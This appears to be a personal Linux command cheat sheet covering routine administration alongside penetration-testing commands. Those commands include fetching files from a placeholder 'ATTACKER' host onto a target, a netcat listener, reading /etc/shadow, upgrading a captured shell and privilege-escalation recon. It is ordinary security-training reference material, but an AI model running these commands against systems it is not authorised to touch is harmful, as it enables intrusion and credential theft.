---
title: Linux Commands Cheat Sheet
tags:
  - reference
  - cheat-sheet
  - linux
  - commands
  - sysadmin
  - foundational
difficulty: foundational
created: 2026-03-23
updated: 2026-03-28
---

# Linux Commands Cheat Sheet

Essential Linux commands for system administration, security operations, and penetration testing.

---

## Navigation & File Management

```bash
pwd                          # Print current directory
ls -la                       # List files (long format, show hidden)
ls -lah                      # Human-readable sizes
cd /path/to/dir              # Change directory
cd ~ / cd -                  # Home / previous directory
mkdir -p dir/subdir          # Create nested directories
cp -r src/ dst/              # Copy directory recursively
mv file newname              # Move or rename file
rm -rf dir/                  # Delete directory recursively (⚠️ DESTRUCTIVE)
ln -s /path/target linkname  # Symbolic link
find / -name "*.conf" 2>/dev/null  # Find files by name
find / -perm -4000 2>/dev/null     # Find SUID files
find / -writable 2>/dev/null       # Find writable files/dirs
find /var/log -mtime -1            # Files modified in last 24h
locate filename              # Fast find (uses updatedb index)
which / whereis command      # Find binary location
```

---

## File Reading & Searching

```bash
cat file.txt                 # Print file contents
less file.txt                # Page through file (q to quit)
head -n 20 file.txt          # First 20 lines
tail -n 20 file.txt          # Last 20 lines
tail -f /var/log/syslog      # Follow live log output
wc -l file.txt               # Count lines
diff file1 file2             # Compare files
grep -r "password" /etc/     # Recursive search
grep -i "admin" file.txt     # Case-insensitive
grep -n "error" file.txt     # Show line numbers
grep -c "error" file.txt     # Count matches
grep -v "debug" file.txt     # Invert match (exclude)
strings binary               # Extract printable strings
xxd file | head              # Hex dump
```

---

## Permissions & Ownership

```bash
chmod 755 file               # rwxr-xr-x
chmod +x script.sh           # Make executable
chmod -R 640 /etc/configs/   # Recursive
chown user:group file        # Change owner
chown -R www-data:www-data /var/www/  # Recursive
ls -la file                  # Check permissions
stat file                    # Detailed file metadata
getfacl file                 # Show ACL permissions
setfacl -m u:user:rw file   # Set ACL permission
umask 027                    # Default permission mask
```

### Permission Bits
| Octal | Binary | Symbolic |
|---|---|---|
| 7 | 111 | rwx |
| 6 | 110 | rw- |
| 5 | 101 | r-x |
| 4 | 100 | r-- |
| 0 | 000 | --- |

**Special bits:** SUID (4xxx) — runs as owner. SGID (2xxx) — runs as group. Sticky (1xxx) — only owner can delete in directory (e.g., `/tmp`).

---

## User & Group Management

```bash
# User management
useradd -m -s /bin/bash username       # Create user with home dir and shell
useradd -m -G sudo,docker username     # Create with supplementary groups
usermod -aG sudo username              # Add user to group (KEEP existing groups)
usermod -s /bin/bash username          # Change shell
usermod -L username                    # Lock account
usermod -U username                    # Unlock account
userdel -r username                    # Delete user + home dir (⚠️ DESTRUCTIVE)
passwd username                        # Set/change password
chage -l username                      # View password aging info
chage -M 90 username                   # Max password age 90 days
chage -E 2026-12-31 username           # Account expiry date

# Group management
groupadd groupname                     # Create group
groupdel groupname                     # Delete group
groups username                        # Show user's groups
id username                            # UID, GID, groups

# Key files
cat /etc/passwd                        # User accounts (name:x:uid:gid:info:home:shell)
cat /etc/shadow                        # Password hashes (root/shadow group only)
cat /etc/group                         # Group definitions
cat /etc/login.defs                    # Password policy defaults
```

---

## Service Management (systemd)

```bash
# Service control
systemctl start nginx                  # Start service
systemctl stop nginx                   # Stop service
systemctl restart nginx                # Restart service
systemctl reload nginx                 # Reload config without restart
systemctl enable nginx                 # Start on boot
systemctl disable nginx                # Don't start on boot
systemctl status nginx                 # Service status + recent logs
systemctl is-active nginx              # Quick check: active/inactive
systemctl is-enabled nginx             # Check boot status

# List services
systemctl list-units --type=service               # Running services
systemctl list-units --type=service --state=failed # Failed services
systemctl list-unit-files --type=service           # All service files

# Troubleshooting
systemctl cat nginx                    # View unit file
systemctl show nginx                   # All service properties
systemctl daemon-reload                # Reload after editing unit files
```

---

## Logs & Journalctl

```bash
# journalctl (systemd log viewer)
journalctl -u sshd                     # Logs for specific service
journalctl -u sshd -n 50              # Last 50 lines
journalctl -u sshd --since "1 hour ago"
journalctl -u sshd --since today
journalctl -u sshd -f                 # Follow live (like tail -f)
journalctl -p err                      # Only errors
journalctl -p warning --since yesterday
journalctl -b                          # Current boot only
journalctl -b -1                       # Previous boot
journalctl --disk-usage                # How much space logs use
journalctl --vacuum-size=500M          # Trim logs to 500MB

# Traditional log files
tail -f /var/log/syslog                # General system log (Debian/Ubuntu)
tail -f /var/log/messages              # General system log (RHEL/CentOS)
tail -f /var/log/auth.log              # Auth/login events (Debian)
tail -f /var/log/secure                # Auth/login events (RHEL)
cat /var/log/kern.log                  # Kernel messages
cat /var/log/cron.log                  # Cron job execution
cat /var/log/apt/history.log           # Package install history (Debian)
cat /var/log/yum.log                   # Package install history (RHEL)
last                                   # Login history
lastb                                  # Failed login attempts
lastlog                                # Last login per user
who / w                                # Who is logged in now

# Log rotation
cat /etc/logrotate.conf                # Global logrotate config
ls /etc/logrotate.d/                   # Per-service rotation configs
logrotate -d /etc/logrotate.conf       # Dry-run test
```

---

## Networking

```bash
# Interface & address info
ip addr                                # Show all interfaces + IPs
ip addr show eth0                      # Specific interface
ip link set eth0 up/down               # Enable/disable interface
ip route                               # Routing table
ip neigh                               # ARP table (IP→MAC)
ifconfig                               # Legacy — use ip addr instead
hostname -I                            # All IPs on this host

# DNS
cat /etc/resolv.conf                   # DNS resolver config
cat /etc/hosts                         # Local hostname overrides
dig example.com                        # DNS lookup (detailed)
dig +short example.com                 # DNS lookup (IP only)
nslookup example.com                   # DNS lookup (interactive)
host example.com                       # Simple DNS lookup
resolvectl status                      # systemd-resolved status

# Connections & ports
ss -tulnp                              # Listening ports + PIDs (modern)
netstat -tulnp                         # Same (legacy)
ss -s                                  # Socket statistics summary
lsof -i :80                            # What's using port 80
lsof -i -P -n                         # All network connections

# Diagnostics
ping -c 4 8.8.8.8                      # ICMP ping
traceroute 8.8.8.8                     # Trace network path
mtr 8.8.8.8                            # Combined ping+traceroute
curl -I http://example.com             # HTTP headers
curl -v https://example.com            # Verbose HTTP request
wget http://example.com/file           # Download file
nc -zv host 22                         # Test if port is open
nc -lvnp 4444                          # Listen on port

# Firewall (UFW — Ubuntu/Debian)
ufw status verbose                     # Current rules
ufw enable / ufw disable               # Toggle firewall
ufw allow 22/tcp                       # Allow SSH
ufw allow from 192.168.1.0/24 to any port 22   # Allow SSH from subnet
ufw deny 23/tcp                        # Block telnet
ufw delete allow 22/tcp                # Remove rule
ufw reset                              # Reset all rules

# Firewall (firewalld — RHEL/CentOS)
firewall-cmd --state                   # Running?
firewall-cmd --list-all                # Current rules
firewall-cmd --add-service=http --permanent
firewall-cmd --add-port=8080/tcp --permanent
firewall-cmd --reload                  # Apply changes

# Firewall (iptables — low-level)
iptables -L -v -n                      # List all rules
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
iptables -A INPUT -s 10.0.0.0/8 -j DROP
iptables-save > /etc/iptables/rules.v4
```

---

## Disk & Storage Management

```bash
# Disk usage
df -h                                  # Filesystem usage (human-readable)
df -ih                                 # Inode usage
du -sh /var/log/                       # Directory size
du -sh /* 2>/dev/null | sort -rh | head -10   # Top 10 largest dirs
ncdu /                                 # Interactive disk usage (install ncdu)

# Block devices
lsblk                                  # List block devices + mount points
blkid                                  # Show UUIDs and filesystem types
fdisk -l                               # Partition table (⚠️ be careful)

# Mounting
mount /dev/sdb1 /mnt/data              # Mount filesystem
umount /mnt/data                       # Unmount
cat /etc/fstab                         # Persistent mounts (survives reboot)
mount -a                               # Mount everything in fstab

# NFS
showmount -e <NFS_SERVER>              # List NFS exports
mount -t nfs server:/share /mnt/nfs    # Mount NFS share
# fstab entry: server:/share /mnt/nfs nfs defaults 0 0

# SMB/CIFS
smbclient -L //<SERVER>/ -N            # List SMB shares
mount -t cifs //server/share /mnt/smb -o username=user,password=pass
# fstab: //server/share /mnt/smb cifs credentials=/etc/smbcreds 0 0

# LVM basics
pvs / vgs / lvs                        # Physical/Volume/Logical volume info
lvextend -L +10G /dev/vg0/lv_root      # Extend logical volume
resize2fs /dev/vg0/lv_root             # Resize ext4 filesystem after extend
```

---

## Package Management

```bash
# Debian / Ubuntu (apt)
apt update                             # Refresh package index
apt upgrade                            # Upgrade all packages
apt install nginx                      # Install package
apt remove nginx                       # Remove (keep config)
apt purge nginx                        # Remove + delete config
apt autoremove                         # Remove unused dependencies
apt search keyword                     # Search packages
apt show nginx                         # Package details
dpkg -l                                # List installed packages
dpkg -l | grep nginx                   # Find installed package

# RHEL / CentOS / Fedora (dnf/yum)
dnf update / yum update                # Update all
dnf install nginx / yum install nginx  # Install
dnf remove nginx / yum remove nginx    # Remove
dnf search keyword                     # Search
dnf info nginx                         # Package details
rpm -qa                                # List installed packages
rpm -qa | grep nginx                   # Find package

# Check for security updates (Debian)
apt list --upgradable 2>/dev/null | grep -i securi

# Unattended upgrades (Debian)
apt install unattended-upgrades
dpkg-reconfigure unattended-upgrades
```

---

## Process Management

```bash
ps aux                                 # List all processes
ps aux | grep apache                   # Filter
ps -ef --forest                        # Process tree
top / htop                             # Live process monitor
kill PID                               # Graceful termination (SIGTERM)
kill -9 PID                            # Force kill (SIGKILL)
killall processname                    # Kill all by name
pkill -f "pattern"                     # Kill by command line match
nice -n 10 command                     # Start with lower priority
renice -n 5 -p PID                     # Change running process priority
nohup command &                        # Run in background, survive logout
jobs / fg / bg                         # Job control
```

---

## Cron & Scheduled Tasks

```bash
# Edit crontab
crontab -e                             # Edit current user's cron
crontab -l                             # List current user's cron
crontab -u username -l                 # List another user's cron
crontab -r                             # Remove all cron jobs (⚠️)

# Cron format
# ┌───── minute (0-59)
# │ ┌───── hour (0-23)
# │ │ ┌───── day of month (1-31)
# │ │ │ ┌───── month (1-12)
# │ │ │ │ ┌───── day of week (0-7, 0/7=Sun)
# * * * * * command

# Examples
0 2 * * * /opt/scripts/backup.sh          # Daily at 2am
*/5 * * * * /opt/scripts/healthcheck.sh   # Every 5 minutes
0 0 * * 0 /opt/scripts/weekly-report.sh   # Sunday midnight
30 6 1 * * /opt/scripts/monthly-audit.sh  # 1st of month, 6:30am

# System cron directories (scripts placed here run automatically)
ls /etc/cron.daily/     # Runs daily
ls /etc/cron.weekly/    # Runs weekly
ls /etc/cron.monthly/   # Runs monthly
cat /etc/crontab        # System-level crontab
```

---

## SSH Administration

```bash
# Connecting
ssh user@host                          # Basic connect
ssh -p 2222 user@host                  # Non-standard port
ssh -i ~/.ssh/id_rsa user@host         # Specific key
ssh -L 8080:localhost:80 user@host     # Local port forward
ssh -R 9090:localhost:80 user@host     # Remote port forward
ssh -D 1080 user@host                  # SOCKS proxy (dynamic forward)
ssh -J jumphost user@target            # Jump host / bastion

# Key management
ssh-keygen -t ed25519 -C "comment"     # Generate key (ed25519 preferred)
ssh-copy-id user@host                  # Copy public key to server
cat ~/.ssh/authorized_keys             # Authorized keys on server

# SSH hardening (/etc/ssh/sshd_config)
# PermitRootLogin no                   # Disable root SSH login
# PasswordAuthentication no            # Key-only auth
# MaxAuthTries 3                       # Limit login attempts
# AllowUsers admin deploy              # Whitelist users
# Port 2222                            # Non-standard port
# ClientAliveInterval 300              # Timeout idle sessions
# ClientAliveCountMax 2

# Apply changes
systemctl restart sshd
```

---

## System Information

```bash
uname -a                               # Kernel version, architecture
cat /etc/os-release                    # OS details (distro, version)
hostname / hostnamectl                 # Hostname
uptime                                 # Uptime, load averages
free -h                                # Memory usage
lscpu                                  # CPU info
lsblk                                  # Block devices
lspci                                  # PCI devices
lsusb                                  # USB devices
dmesg | tail                           # Kernel ring buffer (hardware messages)
cat /proc/meminfo                      # Detailed memory
cat /proc/cpuinfo                      # Detailed CPU
timedatectl                            # Time zone and NTP status
timedatectl set-timezone America/New_York  # Set timezone
```

---

## Archive & Compression

```bash
tar -czf archive.tar.gz dir/          # Create gzip tar
tar -xzf archive.tar.gz               # Extract gzip tar
tar -xzf archive.tar.gz -C /dest/     # Extract to specific dir
tar -xjf archive.tar.bz2              # Extract bzip2 tar
tar -tf archive.tar.gz                 # List contents without extracting
zip -r archive.zip dir/                # Create zip
unzip archive.zip                      # Extract zip
gzip / gunzip file                     # Compress/decompress single file
```

---

## File Transfer (Admin & Pentest)

```bash
# SCP
scp file.txt user@host:/remote/path    # Upload
scp user@host:/remote/file /local/     # Download
scp -r dir/ user@host:/remote/         # Recursive

# rsync (preferred for large/incremental)
rsync -avz /local/dir/ user@host:/remote/dir/   # Sync with compression
rsync -avz --delete src/ dst/          # Sync + delete extraneous files

# Python HTTP server
python3 -m http.server 8080           # Serve current directory

# wget / curl on target
wget http://ATTACKER:8080/file -O /tmp/file
curl http://ATTACKER:8080/file -o /tmp/file

# Base64 transfer (when no other option)
base64 file > file.b64 && cat file.b64
echo "BASE64STRING" | base64 -d > file
```

---

## Text Processing

```bash
# grep
grep -r "password" /etc/              # Recursive
grep -i "error" file                   # Case insensitive
grep -v "debug" file                   # Invert match
grep -c "error" file                   # Count matches
grep -oE "[0-9]{1,3}(\.[0-9]{1,3}){3}" file   # Extract IPs

# awk
awk '{print $1}' access.log           # First field
awk -F: '{print $1}' /etc/passwd      # Split on colon
awk '$9 == 200' access.log            # Filter by field value

# sed
sed 's/foo/bar/g' file                # Replace all
sed -n '10,20p' file                  # Print lines 10-20
sed -i 's/old/new/g' file             # In-place edit (⚠️)

# sort & uniq
cat ips.txt | sort | uniq -c | sort -rn   # Count unique values
sort -u wordlist.txt                  # Deduplicate

# cut & tr
cut -d: -f1 /etc/passwd              # Extract field
echo "HELLO" | tr 'A-Z' 'a-z'        # Lowercase
```

---

## Shell Upgrade (Pentest)

```bash
# Upgrade basic shell to interactive PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Then: Ctrl+Z → stty raw -echo; fg → reset → export TERM=xterm
```

---

## Privilege Escalation Recon

```bash
sudo -l                                # What can I sudo?
cat /etc/sudoers                       # Sudoers (if readable)
find / -perm -u=s -type f 2>/dev/null  # SUID binaries
find / -perm -o+w -type f 2>/dev/null | grep -v /proc  # World-writable
cat /etc/cron* 2>/dev/null             # System cron jobs
echo $PATH                             # PATH hijacking check
env                                    # Environment variables
```

---

## Related Notes
- Bash-Scripting
- Linux-Privilege-Escalation
- Networking-Basics
- Common-Ports
- Nmap
- Netcat
- System-Admin-Reference

---
*Updated: 2026-03-28 | Difficulty: Foundational*
---
<- [[Reference-MOC]]